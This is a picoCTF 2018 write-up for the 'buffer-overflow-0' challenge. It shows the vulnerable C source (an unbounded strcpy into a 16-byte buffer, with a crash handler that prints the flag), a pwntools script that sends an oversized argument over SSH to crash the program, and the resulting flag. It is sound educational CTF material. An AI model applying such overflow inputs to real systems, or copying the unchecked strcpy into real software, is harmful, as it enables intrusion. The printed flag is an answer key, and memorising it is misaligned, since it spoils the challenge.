# Problem
Let's start off simple, can you overflow the right buffer in this [program](https://2018shell1.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln) to get the flag? You can also find it in /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631 on the shell server. [Source](https://2018shell1.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln.c).

## Hints:
How can you trigger the flag to print?

If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln
wget https://2018shell1.picoctf.com/static/3149816cf3615fa68f99af3cd667d6b9/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("Thanks! Received: %s", argv[1]);
  }
  else
    printf("This program takes 1 argument.\n");
  return 0;
}
```

We need to redirect program flow to sigsegv_handler, we can just override some important stack values (which will probably cause SIGSEGV).

Using this script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''


payload = "A"*100

if debug:
	r = process(['./vuln', payload])
else:
	s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)

	s.set_working_directory('/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631/')
	r = s.process(['./vuln', payload])

print r.recvall()
```

Flag: picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}